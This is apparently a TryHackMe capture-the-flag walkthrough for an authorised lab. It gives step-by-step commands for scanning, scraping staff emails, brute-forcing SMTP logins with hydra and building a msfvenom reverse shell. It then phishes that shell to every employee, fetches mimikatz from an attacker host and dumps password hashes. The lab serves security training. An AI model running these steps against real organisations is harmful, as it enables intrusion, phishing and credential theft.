# [You Got Mail](https://tryhackme.com/room/yougotmail)

## Test your recon and phishing skills in order to complete your objective.

# Scenario

You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on MACHINE_IP and strictly passive reconnaissance on [brownbrick.co](https://brownbrick.co/). The scope includes only the domain and IP provided and does not include other TLDs.

# Flag Submission

## Conquer the machine and submit the flags below.

### What is the user flag?

1. Run a full-port scan with service version detection to enumerate all open ports and identify the services running on the target machine.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2026-06-12T21:32:52
|_Not valid after:  2026-12-12T21:32:52
| rdp-ntlm-info:
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-13T21:38:08+00:00
|_ssl-date: 2026-06-13T21:38:16+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-06-13T21:38:12
|_  start_date: N/A
```

2. Perform passive reconnaissance on the brownbrick.co website. Navigate to `https://brownbrick.co/menu.html` and locate the **Our Team** section to collect employee email addresses. Save them to `emails.txt` for use in the credential brute-force attack.

```
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
```

3. Use CeWL to crawl the brownbrick.co website and generate a custom password wordlist based on site content. Employees often use company-related words as passwords, making this a targeted and effective approach.

```bash
cewl --lowercase https://brownbrick.co/ > passwords.txt
```

4. Perform a credential brute-force attack against the SMTP service on port 587 using the collected email addresses and the generated wordlist. This will attempt to authenticate to the mail server with each email/password combination.

```bash
hydra -L emails.txt -P passwords.txt <TARGET_IP> smtp -s 587
```

5. Start a netcat listener on the attacking machine to catch the incoming reverse shell connection once the malicious payload is executed on the target.

```bash
nc -lvnp 4444
```

6. Generate a Windows x64 reverse shell executable using msfvenom. When executed on the victim machine, it will connect back to the attacker's listener.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe
```

7. Using lhedvig's authenticated SMTP credentials, send phishing emails to every employee with the malicious `shell.exe` attachment. Sending from a legitimate internal account increases the likelihood that recipients will open the attachment.

```bash
for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "test" -m "test" -a shell.exe -s <TARGET_IP>:25 -xu "lhedvig@brownbrick.co" -xp "bricks"; done
```

8. Wait for a recipient to open the attachment. Shortly after the emails are delivered, `wrohit` executes the payload and a reverse shell connects back to the listener.

9. Verify the current user context and retrieve the user flag from wrohit's Desktop.

```bash
whoami
dir C:\Users\wrohit\Desktop
type C:\Users\wrohit\Desktop\flag.txt
```

[SCREEN01]

---

### What is the password of the user _wrohit_?

_As an administrator you can dump the hashed credentials that reside in memory._

1. Start a Python HTTP server on the attacking machine to serve the mimikatz binary to the target.

```bash
python3 -m http.server
```

2. On the target machine, navigate to a writable directory and download the mimikatz executable using `curl`.

```bash
cd C:\ProgramData
curl http://<ATTACKER_IP>:8000/mimikatz.exe -o mimikatz.exe
```

3. Execute mimikatz with `token::elevate` to impersonate a SYSTEM token, then use `lsadump::sam` to dump the local SAM database, which contains NTLM password hashes for all local user accounts.

```bash
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
```

**Results:**

```
RID  : 000003f6 (1014)
User : wrohit
  Hash NTLM: 8458995f1d0a4b0c107fb8e23362c814
```

4. Copy the NTLM hash and submit it to [CrackStation](https://crackstation.net/) to recover the plaintext password.

[SCREEN02]

---

### What is the password to access the hMailServer Administrator Dashboard?

_hMail stores passwords in MD5._

1. Read the hMailServer configuration file to locate the administrator password hash stored in the `[Security]` section.

```bash
type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
```

**Results:**

```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
[Database]
Type=MSSQLCE
Username=
Password=47f104fa02185e821a83b2cfa56cf4ec
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

2. Submit the hash to [CrackStation](https://crackstation.net/) to recover the plaintext administrator password.

[SCREEN03]
